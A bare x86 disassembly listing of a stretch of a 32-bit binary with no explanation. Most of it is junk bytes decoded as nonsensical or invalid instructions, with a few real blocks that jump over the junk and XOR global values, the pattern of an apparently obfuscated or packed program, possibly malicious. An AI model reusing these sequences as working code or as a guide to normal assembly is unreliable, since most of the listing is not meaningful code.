  40865e:	mov    al,ds:0x8f828434
  408663:	test   DWORD PTR [ebx+0x4bf1533],esp
  408669:	jmp    0x7534:0xa1ab6adb
  408670:	add    ebp,ebx
  408672:	dec    edi
  408673:	aam    0x5b
  408675:	dec    eax
  408676:	jbe    0x408646
  408678:	ror    DWORD PTR [ecx-0x1a],cl
  40867b:	push   ebp
  40867c:	mov    ebp,0x1ee6e22d
  408681:	je     0x4086aa
  408683:	xlat   BYTE PTR ds:[ebx]
  408684:	ror    DWORD PTR ds:0x1b0302de,0xd2
  40868b:	mov    ds:0x742f810,al
  408690:	sub    eax,0xbdc9b74d
  408695:	fild   DWORD PTR [ecx]
  408697:	arpl   WORD PTR [eax-0x14744e9],bp
  40869d:	adc    cl,BYTE PTR [esi+0x37631581]
  4086a3:	inc    ebx
  4086a4:	add    bl,bh
  4086a6:	ss inc ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	out    dx,eax
  4086af:	aaa    
  4086b0:	inc    ebx
  4086b1:	add    BYTE PTR [edi],ah
  4086b3:	cmp    BYTE PTR [ebx+0x0],al
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x56097b4a],ecx
  4086ca:	(bad)
  4086ce:	jle    0x4086f4
  4086d0:	jl     0x408750
  4086d2:	jle    0x40869b
  4086d4:	jle    0x408676
  4086d6:	dec    esp
  4086d7:	inc    DWORD PTR [esi+0x107067f0]
  4086dd:	cmp    esi,ebp
  4086df:	std    
  4086e0:	xor    eax,0x3828efae
  4086e5:	xchg   esi,eax
  4086e6:	aas    
  4086e7:	test   BYTE PTR [ecx-0x3ad3058a],bl
  4086ed:	fcomp  QWORD PTR [ecx+esi*2]
  4086f0:	cmp    dl,BYTE PTR [edi]
  4086f2:	jns    0x408733
  4086f4:	sbb    BYTE PTR [ecx+0xc1fe822],dl
  4086fa:	or     BYTE PTR [eax+0x3104cbbe],ah
  408700:	fdivr  QWORD PTR [ebx-0x220dae82]
  408706:	mov    esi,0x27d5dae1
  40870b:	lds    edi,FWORD PTR [ebx-0x7d529156]
  408711:	xor    ch,0x83
  408714:	dec    ebx
  408715:	and    al,0x96
  408717:	aam    0xe2
  408719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40871a:	aam    0x39
  40871c:	xor    ah,BYTE PTR [esi+0x6f5fce96]
  408722:	test   al,dh
  408724:	hlt    
  408725:	iret   
  408726:	mov    bl,0xc1
  408728:	inc    ebx
  408729:	xor    BYTE PTR [ebx+0xf3b4dc],cl
  40872f:	jo     0x4086d2
  408731:	out    0xa6,al
  408733:	ficomp DWORD PTR ds:0x42d07e07
  408739:	test   BYTE PTR [esi+esi*2-0x18],bh
  40873d:	or     dh,BYTE PTR [ebx+0xdd0d711]
  408743:	test   BYTE PTR [edx+edi*2+0x6cc4f6b],cl
  40874a:	or     BYTE PTR [edi+0x54d2cc63],0x96
  408751:	rcr    DWORD PTR [esi+0x58],1
  408754:	push   esi
  408755:	sahf   
  408756:	mov    dh,0xe3
  408758:	cmp    al,ah
  40875a:	imul   BYTE PTR ds:0xa4e97cc9
  408760:	mov    cl,0x8
  408762:	cld    
  408763:	or     ebx,DWORD PTR [edx]
  408765:	mov    edi,0x798a525e
  40876a:	pop    ss
  40876b:	mov    ds:0x23956188,al
  408770:	xchg   esi,eax
  408771:	scas   al,BYTE PTR es:[edi]
  408772:	in     al,dx
  408773:	(bad)  
  408774:	jmp    0x4087bd
  408776:	dec    edi
  408777:	push   0x8fc12179
  40877c:	sbb    DWORD PTR [eax-0x23590723],edi
  408782:	(bad)  
  408783:	fld    QWORD PTR [edx+0x76]
  408786:	(bad)  
  408787:	sub    dh,bh
  408789:	call   0xce75:0x10c77612
  408790:	leave  
  408791:	jbe    0x4087e5
  408793:	xchg   edi,eax
  408794:	adc    ecx,DWORD PTR [edx]
  408796:	dec    esi
  408797:	stos   BYTE PTR es:[edi],al
  408798:	dec    eax
  408799:	xchg   esi,ecx
  40879b:	pop    eax
  40879c:	sbb    BYTE PTR [eax],ch
  40879e:	sbb    esp,esp
  4087a0:	shl    BYTE PTR [edi+0x78c38c26],1
  4087a6:	int3   
  4087a7:	outs   dx,BYTE PTR ds:[esi]
  4087a8:	xchg   cl,dl
  4087aa:	push   ecx
  4087ab:	mov    eax,0x427cde08
  4087b0:	and    DWORD PTR [ebx-0x15ef9cb9],edx
  4087b6:	jne    0x408821
  4087b8:	push   ds
  4087b9:	add    BYTE PTR fs:[edx-0x43],ch
  4087bd:	mov    dl,0xe2
  4087bf:	bnd je 0x408777
  4087c2:	mov    al,ds:0xc280521d
  4087c7:	es das 
  4087c9:	cmp    al,0x32
  4087cb:	fst    DWORD PTR [ebp-0x4e]
  4087ce:	xor    eax,0xad374eb2
  4087d3:	lods   al,BYTE PTR ds:[esi]
  4087d4:	sar    ch,1
  4087d6:	sub    al,BYTE PTR [esi]
  4087d8:	ja     0x4087fb
  4087da:	pushf  
  4087db:	inc    esp
  4087dc:	fcmovnb st,st(4)
  4087de:	cmp    esp,DWORD PTR [edx]
  4087e0:	and    BYTE PTR [ebx],dh
  4087e2:	mov    ch,0x89
  4087e4:	test   al,0xa
  4087e6:	imul   edi,edi,0x62
  4087e9:	shr    BYTE PTR [eax+0x2e3b52ee],cl
  4087ef:	mov    al,ds:0xae13c35b
  4087f4:	sub    DWORD PTR [edx+0x3aca4c39],edx
  4087fa:	mul    BYTE PTR [ecx-0x26726a97]
  408800:	js     0x408816
  408802:	shl    BYTE PTR [ebx-0x48],cl
  408805:	add    esi,0x12
  408808:	fwait
  408809:	xlat   BYTE PTR ds:[ebx]
  40880a:	in     eax,0x8f
  40880c:	aas    
  40880d:	adc    eax,DWORD PTR [edi+0x276ad933]
  408813:	cmp    DWORD PTR [esp+esi*2],eax
  408816:	outs   dx,BYTE PTR ds:[esi]
  408817:	test   eax,0x4fef63e3
  40881c:	sub    al,0xa9
  40881e:	push   cs
  40881f:	mov    esp,0xd1cf56ec
  408824:	mov    bh,0xc2
  408826:	leave  
  408827:	xchg   DWORD PTR [ecx+0x5dcafcd7],edx
  40882d:	inc    ebp
  40882e:	mov    bl,0x43
  408830:	scas   eax,DWORD PTR es:[edi]
  408831:	ss daa 
  408833:	pop    ecx
  408834:	aam    0xb7
  408836:	call   0x73d5:0x91274a92
  40883d:	scas   al,BYTE PTR es:[edi]
  40883e:	push   eax
  40883f:	mov    cl,0xa5
  408841:	adc    BYTE PTR [ebp+0x23],al
  408844:	aas    
  408845:	pushf  
  408846:	lods   eax,DWORD PTR ds:[esi]
  408847:	std    
  408848:	sbb    BYTE PTR [ebx],al
  40884a:	or     al,0x26
  40884c:	adc    dl,BYTE PTR ds:0xcf294134
  408852:	aas    
  408853:	jmp    0x98a8a662
  408858:	mov    esi,0x5038a4c5
  40885d:	(bad)
  408861:	out    dx,eax
  408862:	sbb    eax,0x8fe070d9
  408867:	and    BYTE PTR [edi+edx*2-0x6f8681b2],ch
  40886e:	aad    0x16
  408870:	js     0x40887d
  408872:	and    al,0xa3
  408874:	scas   eax,DWORD PTR es:[edi]
  408875:	pusha  
  408876:	or     eax,0xc7ca70fc
  40887b:	dec    ebx
  40887c:	push   ebp
  40887d:	shrd   esi,eax,0xcd
  408881:	sub    eax,0x335e8fd5
  408886:	lds    ebx,FWORD PTR [ebx-0x26552ff8]
  40888c:	or     ebx,DWORD PTR [edx+edx*4-0x29]
  408890:	push   es
  408891:	pusha  
  408892:	xor    edx,DWORD PTR [edx+0x6c]
  408895:	shl    BYTE PTR [ebx],cl
  408897:	lods   al,BYTE PTR ds:[esi]
  408898:	mov    ch,0x38
  40889a:	adc    DWORD PTR [ecx-0x6ba0f479],edi
  4088a0:	(bad)  
  4088a1:	mov    esp,0x971911da
  4088a6:	dec    esp
  4088a7:	xchg   edx,eax
  4088a8:	nop
  4088a9:	mov    eax,ds:0x8ac5e1a4
  4088ae:	ret    0x8ffe
  4088b1:	pop    ds
  4088b2:	inc    ebp
  4088b3:	dec    eax
  4088b4:	ds jb  0x408926
  4088b7:	sbb    esi,DWORD PTR [edi+0x1d04d3b3]
  4088bd:	pop    esp
  4088be:	add    esi,DWORD PTR [ebx+0x6c]
  4088c1:	fidiv  WORD PTR [ecx+eax*4]
  4088c4:	mov    ds:0x82dc01f1,eax
  4088c9:	stc    
  4088ca:	outs   dx,DWORD PTR ds:[esi]
  4088cb:	sbb    dh,bl
  4088cd:	jbe    0x40891d
  4088cf:	les    ecx,FWORD PTR [edx]
  4088d1:	dec    esi
  4088d2:	adc    eax,0x9a9dcab1
  4088d7:	add    edx,DWORD PTR [esi]
  4088d9:	sub    ah,ah
  4088db:	mov    edi,0xc68bb172
  4088e0:	and    eax,0x3c7c61d4
  4088e5:	pop    ecx
  4088e6:	cmp    cl,BYTE PTR [eax]
  4088e8:	inc    esp
  4088e9:	cmp    dh,al
  4088eb:	mov    ch,BYTE PTR [ebx+esi*1+0x17]
  4088ef:	push   ebx
  4088f0:	mov    edi,0xc23a606e
  4088f5:	sbb    BYTE PTR [eax+eax*2-0x66],bl
  4088f9:	mov    dl,0x41
  4088fb:	mov    bl,0xe6
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x433763,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x70d3be2c
  408968:	mov    eax,0x7e7ed4b0
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	mov    bl,0xb4
  408973:	daa    
  408974:	pop    edi
  408975:	repnz int3 
  408977:	inc    eax
  408978:	push   ebx
  408979:	das    
  40897a:	pushf  
  40897b:	stc    
  40897c:	mov    bl,0x97
  40897f:	mov    dh,0x2
  408981:	sub    ah,cl
  408983:	push   cs
  408984:	pop    esi
  408985:	dec    esp
  408986:	or     BYTE PTR [eax-0x3f],al
  408989:	imul   ecx,DWORD PTR [eax-0x75],0xd0d0a75c
  408990:	(bad)  
  408991:	popa   
  408992:	ins    BYTE PTR es:[edi],dx
  408993:	les    edx,FWORD PTR [ecx+0x31]
  408996:	jns    0x4089ba
  408998:	pop    eax
  408999:	(bad)  
  40899a:	cmp    BYTE PTR [ebp+0x247eb9ab],bl
  4089a0:	aas    
  4089a1:	dec    ecx
  4089a2:	push   eax
  4089a3:	and    DWORD PTR [edx+esi*4+0x69],eax
  4089a7:	int3   
  4089a8:	fdivr  st,st(7)
  4089aa:	(bad)  
  4089ab:	out    dx,al
  4089ac:	jge    0x40895f
  4089ae:	sbb    eax,0x67292f94
  4089b3:	sbb    edx,DWORD PTR [ecx-0x6b]
  4089b6:	push   0x6b
  4089b8:	mov    ebx,0xa35b7be3
  4089bd:	sub    BYTE PTR [esi+0x7a],dl
  4089c0:	pusha  
  4089c1:	add    eax,0x5c7c291c
  4089c6:	xor    al,0x84
  4089c8:	push   esp
  4089c9:	jo     0x4089e1
  4089cb:	inc    ecx
  4089cc:	in     eax,dx
  4089cd:	cmc    
  4089ce:	mov    BYTE PTR [eax-0x2c9a0d5a],al
  4089d4:	push   es
  4089d5:	pop    ecx
  4089d6:	lods   eax,DWORD PTR ds:[esi]
  4089d7:	or     eax,0x281a93e4
  4089dc:	push   edi
  4089dd:	popa   
  4089de:	mov    esi,0x2840d50f
  4089e3:	pop    ss
  4089e4:	(bad)  
  4089e5:	fadd   QWORD PTR [eax+0xf]
  4089e8:	dec    ebx
  4089e9:	stos   BYTE PTR es:[edi],al
  4089ea:	cmp    al,0xc5
  4089ec:	cli    
  4089ed:	mov    ds:0xa7531651,eax
  4089f2:	xor    cl,0x61
  4089f5:	cmp    DWORD PTR [edi-0x3fc4f9f],eax
  4089fb:	fcmovnbe st,st(4)
  4089fd:	mov    eax,ds:0xdb7951f2
  408a02:	frstor [ebx-0x4e]
  408a05:	dec    edi
  408a06:	lahf   
  408a07:	dec    eax
  408a08:	popf   
  408a09:	rol    cl,cl
  408a0b:	mov    ecx,DWORD PTR [ebx]
  408a0d:	cmp    ah,BYTE PTR [ebx]
  408a0f:	sub    ecx,ecx
  408a11:	mov    cl,0x30
  408a13:	sbb    esp,edx
  408a15:	mov    dl,0xd4
  408a17:	adc    ch,BYTE PTR [ebp-0x5a04ed9a]
  408a1d:	es dec esi
  408a1f:	daa    
  408a20:	pop    esp
  408a21:	ficom  WORD PTR [ebx-0x5a3aeadf]
  408a27:	mov    esp,0x7c517b40
  408a2c:	inc    eax
  408a2d:	and    DWORD PTR [eax+0x24],edx
  408a30:	xchg   ecx,eax
  408a31:	mov    esp,0x7a6f8726
  408a36:	xchg   edx,eax
  408a37:	push   ebx
  408a38:	fcmovnu st,st(1)
  408a3a:	fcmovnb st,st(3)
  408a3c:	jbe    0x4089f9
  408a3e:	cmp    ebp,ecx
  408a40:	sub    eax,0x369f8385
  408a45:	imul   ecx,DWORD PTR [edi],0x33
  408a48:	xor    DWORD PTR [ebx-0x62e6722f],0x23bfc799
  408a52:	pop    edx
  408a53:	test   al,0xc4
  408a55:	and    ch,0xc8
  408a58:	xor    al,0xb9
  408a5a:	popa   
  408a5b:	jle    0x408a44
  408a5d:	xlat   BYTE PTR ds:[ebx]
  408a5e:	jge    0x408a32
  408a60:	ja     0x408ac7
  408a62:	mov    bh,0x6d
  408a64:	or     eax,0xf8bd6666
  408a69:	sub    eax,0x45413030
  408a6e:	stos   DWORD PTR es:[edi],eax
  408a6f:	inc    edx
  408a70:	icebp  
  408a71:	push   esp
  408a72:	call   0x9868:0x2cd712de
  408a79:	cwde   
  408a7a:	test   bh,bh
  408a7c:	jg     0x408a92
  408a7e:	xor    BYTE PTR [edi-0x8],ah
  408a81:	mov    WORD PTR [eax+0x5fe380c],ss
  408a87:	fcomp  QWORD PTR [ebp+0x10]
  408a8a:	add    eax,0x7d06c4f1
  408a8f:	loopne 0x408ac3
  408a91:	into   
  408a92:	mov    edi,0x862c5914
  408a97:	in     al,0x4f
  408a99:	int3   
  408a9a:	aas    
  408a9b:	jno    0x408ab5
  408a9d:	jb     0x408a58
  408a9f:	loop   0x408aa3
  408aa1:	nop
  408aa2:	xchg   esi,eax
  408aa3:	cmp    DWORD PTR [edx-0x29aafec2],edi
  408aa9:	pop    edx
  408aaa:	mov    esp,0xbe0b349c
  408aaf:	cmp    DWORD PTR [ebp-0x14a7da41],edx
  408ab5:	(bad)  
  408ab6:	sub    dl,BYTE PTR [ebp-0x5a]
  408ab9:	cmc    
  408aba:	cmp    eax,0xa924f76f
  408abf:	arpl   WORD PTR [edx+0xdd405ed],cx
  408ac5:	in     al,0x37
  408ac7:	retf   
  408ac8:	fucomip st,st(2)
  408aca:	xchg   edx,eax
  408acb:	push   esi
  408acc:	shl    bh,0xb8
  408acf:	push   esi
  408ad0:	jp     0x408b4c
  408ad2:	mov    edx,0x8bd81ce4
  408ad7:	ret    
  408ad8:	(bad)  
  408ad9:	fcomp  DWORD PTR [edx-0x475f3f07]
  408adf:	aaa    
  408ae0:	sbb    al,0x14
  408ae2:	jno    0x408b5d
  408ae4:	xchg   ebx,eax
  408ae5:	call   0x5dda:0xaa9cd0e1
  408aec:	(bad)  
  408aed:	xor    eax,0xb76cbb97
  408af2:	dec    esp
  408af3:	xchg   DWORD PTR [ecx-0x3b],esp
  408af6:	pop    es
  408af7:	stc    
  408af8:	cmp    ah,ah
  408afa:	jo     0x408b73
  408afc:	sbb    al,0x61
  408afe:	(bad)  
  408aff:	std    
  408b00:	out    dx,al
  408b01:	mov    edi,0x4f11e18c
  408b06:	mov    dl,0x23
  408b08:	(bad)  
  408b09:	xchg   ecx,eax
  408b0a:	ficomp WORD PTR [edi-0xc]
  408b0d:	leave  
  408b0e:	add    al,0xc
  408b10:	data16 test BYTE PTR ds:0xb0f3230a,bl
  408b17:	popa   
  408b18:	fst    DWORD PTR [ecx-0x74]
  408b1b:	les    ecx,FWORD PTR [ecx-0x18]
  408b1e:	lds    eax,FWORD PTR [ebx+0x65716dee]
  408b24:	xor    eax,0x821048e4
  408b29:	sti    
  408b2a:	push   cs
  408b2b:	repz cs push es
  408b2e:	aam    0x39
  408b30:	push   ss
  408b31:	lock fdiv QWORD PTR [ebp+0x31]
  408b35:	xor    al,0x61
  408b37:	ss es push esp
  408b3a:	in     eax,0x70
  408b3c:	ror    BYTE PTR [ecx],0xfd
  408b3f:	ins    BYTE PTR es:[edi],dx
  408b40:	jno    0x408ba6
  408b42:	inc    edx
  408b43:	mov    eax,0x8125113e
  408b48:	cli    
  408b49:	push   eax
  408b4a:	mov    edx,0x5c407c2c
  408b4f:	aaa    
  408b50:	ds int 0xe6
  408b53:	repz adc bh,BYTE PTR [ebx-0x4f8c270a]
  408b5a:	ja     0x408b1d
  408b5c:	inc    edi
  408b5d:	or     al,0x27
  408b5f:	shr    BYTE PTR ds:0x2583b93d,0xcd
  408b66:	dec    eax
  408b67:	jo     0x408be7
  408b69:	xor    al,0xe4
  408b6b:	in     eax,0xf1
  408b6d:	lahf   
  408b6e:	dec    ebx
  408b6f:	add    al,0xe0
  408b71:	aas    
  408b72:	push   ss
  408b73:	pop    edi
  408b74:	icebp  
  408b75:	daa    
  408b76:	jno    0x408b2b
  408b78:	xchg   esp,eax
  408b79:	in     eax,0x1a
  408b7b:	in     eax,dx
  408b7c:	mov    bl,0x2c
  408b7e:	sbb    bh,BYTE PTR [eax]
  408b80:	stos   BYTE PTR es:[edi],al
  408b81:	cmp    ebp,DWORD PTR [edi+0x70]
  408b84:	lods   eax,DWORD PTR ds:[esi]
  408b85:	xchg   DWORD PTR [edx+0x34],ebp
  408b88:	mov    esi,0x85fcd678
  408b8d:	inc    ebp
  408b8e:	cmp    eax,0x4d1b88df
  408b93:	fistp  QWORD PTR [eax]
  408b95:	push   esi
  408b96:	fnstsw WORD PTR [eax]
  408b98:	(bad)  
  408b99:	loop   0x408ba0
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	clc    
  408bf1:	adc    DWORD PTR [eax],ecx
  408bf3:	xchg   esp,eax
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	sbb    dh,BYTE PTR [ecx-0x5914ebe2]
  408c02:	call   FWORD PTR [edx-0x35]
  408c05:	lods   eax,DWORD PTR ds:[esi]
  408c06:	sub    ch,BYTE PTR [ebp-0x3ebc93ea]
  408c0c:	pop    edx
  408c0d:	(bad)  
  408c0e:	(bad)  
  408c0f:	imul   ebx,eax,0x6e
  408c12:	imul   esi,DWORD PTR [edx+0x5],0x4c
  408c16:	push   ds
  408c17:	and    DWORD PTR [edx],ebp
  408c19:	lods   eax,DWORD PTR ds:[esi]
  408c1a:	stos   BYTE PTR es:[edi],al
  408c1b:	rcr    esp,1
  408c1d:	retf   
  408c1e:	add    dh,ch
  408c20:	in     eax,0x75
  408c22:	loope  0x408c29
  408c24:	cmp    al,0xdb
  408c26:	cdq    
  408c27:	aam    0xfb
  408c29:	sub    DWORD PTR [eax],esi
  408c2b:	mov    al,ds:0x49ecaad
  408c30:	add    al,0xd4
  408c32:	es fistp QWORD PTR gs:[ebx-0x5486ba52]
  408c3a:	jno    0x408c0e
  408c3c:	bound  esi,QWORD PTR [eax-0x72]
  408c3f:	out    dx,al
  408c40:	push   esp
  408c41:	jns    0x408bfb
  408c43:	gs ja  0x408c2e
  408c46:	out    dx,al
  408c47:	lahf   
  408c48:	and    ah,BYTE PTR [ebx]
  408c4a:	mov    ch,0xc3
  408c4c:	mov    esp,0xb123c60
  408c51:	push   ecx
  408c52:	pop    ecx
  408c53:	xchg   esi,eax
  408c54:	dec    esi
  408c55:	aaa    
  408c56:	mov    al,ds:0x89ff0eb7
  408c5b:	mov    BYTE PTR [ecx+ebx*4-0x21],bh
  408c5f:	(bad)  
  408c60:	dec    ebp
  408c61:	imul   eax,DWORD PTR [ecx+0x3afdde3d],0xa71f629
  408c6b:	and    cl,BYTE PTR [edi]
  408c6d:	lock xor al,0xfd
  408c70:	sahf   
  408c71:	aad    0xef
  408c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c74:	cmp    ah,cl
  408c76:	inc    ebx
  408c77:	repz hlt 
  408c79:	pop    edi
  408c7a:	loopne 0x408c78
  408c7c:	out    0x4,eax
  408c7e:	ret    0xbd0
  408c81:	fldenv [edi+0xf]
  408c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c85:	in     eax,dx
  408c86:	arpl   WORD PTR [esi],si
  408c88:	in     al,dx
  408c89:	sub    BYTE PTR [ecx+0x45],0xda
  408c8d:	int3   
  408c8e:	xchg   ebp,eax
  408c8f:	adc    eax,0x8c0b8a9d
  408c94:	mul    DWORD PTR [edi-0x4b]
  408c97:	ss push ds
  408c99:	or     edx,DWORD PTR [eax-0x6f]
  408c9c:	adc    dl,BYTE PTR [edi]
  408c9e:	dec    esi
  408c9f:	rcl    ecx,1
  408ca1:	adc    DWORD PTR [ebp-0x7e77e37d],esp
  408ca7:	dec    esi
  408ca8:	sahf   
  408ca9:	shl    DWORD PTR [esi-0x70ca4af3],cl
  408caf:	push   eax
  408cb0:	nop
  408cb1:	and    al,0xb7
  408cb3:	sub    esi,DWORD PTR [ebp+0xbf7bba0]
  408cb9:	jecxz  0x408c47
  408cbb:	cmc    
  408cbc:	popa   
  408cbd:	push   ss
  408cbe:	pushf  
  408cbf:	mov    fs,WORD PTR [ebp+0x554fe5d8]
  408cc5:	fild   QWORD PTR [edi+0x16]
  408cc8:	xchg   edx,eax
  408cc9:	loope  0x408c52
  408ccb:	(bad)  
  408ccc:	pusha  
  408ccd:	sbb    eax,0xc5b8a0d9
  408cd2:	jle    0x408d3e
  408cd4:	xor    bl,BYTE PTR [edx+esi*4]
  408cd7:	inc    ebp
  408cd8:	dec    ebx
  408cd9:	mov    edi,0xb5d2aaf
  408cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cdf:	adc    ch,BYTE PTR [eax]
  408ce1:	es sbb al,ah
  408ce4:	repnz xchg edi,eax
  408ce6:	push   ebx
  408ce7:	loop   0x408cb8
  408ce9:	pop    ecx
  408cea:	lds    esi,FWORD PTR [esi*8-0x501fe079]
  408cf1:	out    dx,eax
  408cf2:	adc    DWORD PTR gs:[eax-0x7daa29d7],ebx
  408cf9:	mov    ebp,0x9cec2e4a
  408cfe:	fist   WORD PTR [eax+eiz*4-0x65a5821f]
  408d05:	(bad)  
  408d06:	test   eax,0xae3f09ab
  408d0b:	gs inc esp
  408d0d:	rcr    DWORD PTR [esi],1
  408d0f:	and    DWORD PTR [ebx+0x0],ecx
  408d12:	dec    esi
  408d13:	push   ebp
  408d14:	jnp    0x408c97
  408d16:	das    
  408d17:	dec    esi
  408d18:	mov    ds:0xcd65047a,al
  408d1d:	rcr    BYTE PTR [edx],1
  408d1f:	dec    edi
  408d20:	out    dx,al
  408d21:	shl    DWORD PTR ds:0xdb7b2f4a,0xdf
  408d28:	mov    cl,0xdb
  408d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d2b:	adc    DWORD PTR gs:[ecx+eiz*4+0x5e6f7073],edi
  408d33:	je     0x408d1f
  408d35:	fwait
  408d36:	pop    ecx
  408d37:	or     eax,0x94026e1
  408d3c:	daa    
  408d3d:	or     eax,0x79c91adc
  408d42:	div    bh
  408d44:	adc    BYTE PTR [ebx+edi*8-0x1fe07537],ah
  408d4b:	aam    0x29
  408d4d:	fld    st(6)
  408d4f:	gs adc al,0xd9
  408d52:	fild   DWORD PTR [esi]
  408d54:	fs mov bh,bl
  408d57:	sub    cl,dh
  408d59:	jae    0x408d63
  408d5b:	mov    ebx,0xdb05cf4a
  408d60:	inc    edi
  408d61:	out    0x40,al
  408d63:	push   esp
  408d64:	mov    ds:0x13b94697,eax
  408d69:	pop    ebp
  408d6a:	shl    DWORD PTR [ebp-0x21],1
  408d6d:	dec    eax
  408d6e:	loop   0x408db4
  408d70:	aaa    
  408d71:	mov    fs,WORD PTR [ebp+0x472b78f5]
  408d77:	sbb    al,BYTE PTR [esp+ecx*1-0x1edc5960]
  408d7e:	je     0x408dcb
  408d80:	mov    eax,0x5286b6b0
  408d85:	and    cl,BYTE PTR [ecx]
  408d87:	daa    
  408d88:	add    al,0x6e
  408d8a:	aad    0x8
  408d8c:	outs   dx,BYTE PTR ds:[esi]
  408d8d:	add    ch,dl
  408d8f:	js     0x408d78
  408d91:	sub    DWORD PTR [ebp-0xc],edi
  408d94:	xchg   ebx,eax
  408d95:	stos   BYTE PTR es:[edi],al
  408d96:	scas   eax,DWORD PTR es:[edi]
  408d97:	add    al,0x73
  408d99:	push   ebx
  408d9a:	outs   dx,BYTE PTR ds:[esi]
  408d9b:	leave  
  408d9c:	mov    eax,0x885078ef
  408da1:	cdq    
  408da2:	pop    ds
  408da3:	rol    BYTE PTR [ebp+0x4e7a5b70],cl
  408da9:	in     eax,dx
  408daa:	xor    DWORD PTR [ebp+edi*4+0x6],0x58d4fe9d
  408db2:	lods   al,BYTE PTR ds:[esi]
  408db3:	add    eax,0x827e9ed3
  408db8:	ins    DWORD PTR es:[edi],dx
  408db9:	popf   
  408dba:	cmc    
  408dbb:	int3   
  408dbc:	and    bl,dl
  408dbe:	rol    DWORD PTR [esi-0x25336f78],0x4c
  408dc5:	or     esi,DWORD PTR [ebp-0x666e7d80]
  408dcb:	xor    BYTE PTR [ecx+ecx*4+0x43],dl
  408dcf:	test   al,0xf2
  408dd1:	jmp    0xeb9b9f5f
  408dd6:	pop    edi
  408dd7:	inc    edi
  408dd8:	fadd   st,st(6)
  408dda:	outs   dx,DWORD PTR ds:[esi]
  408ddb:	mov    ebp,0xc0643e49
  408de0:	aam    0x41
  408de2:	in     al,dx
  408de3:	mov    ebx,0x127c0842
  408de8:	fsub   QWORD PTR [ebx-0x3690f6bc]
  408dee:	adc    dl,BYTE PTR [ebx]
  408df0:	icebp  
  408df1:	das    
  408df2:	mov    esp,ecx
  408df4:	(bad)  
  408df5:	push   esp
  408df6:	cs mov ebp,0x2f2832ad
  408dfc:	out    dx,al
  408dfd:	fs dec edi
  408dff:	(bad)  
  408e00:	push   0xcef16f11
  408e05:	rcl    DWORD PTR [edi],0xd7
  408e08:	sbb    cl,BYTE PTR [ecx]
  408e0a:	dec    edi
  408e0b:	cli    
  408e0c:	aas    
  408e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e0e:	mov    edx,0xbfefec0c
  408e13:	cmp    ecx,DWORD PTR ds:0x8cbac920
  408e19:	scas   eax,DWORD PTR es:[edi]
  408e1a:	sub    esi,DWORD PTR [eax+eax*4-0x3cc3f102]
  408e21:	xchg   edx,eax
  408e22:	sbb    BYTE PTR [edi+ebp*8],al
  408e25:	out    dx,eax
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
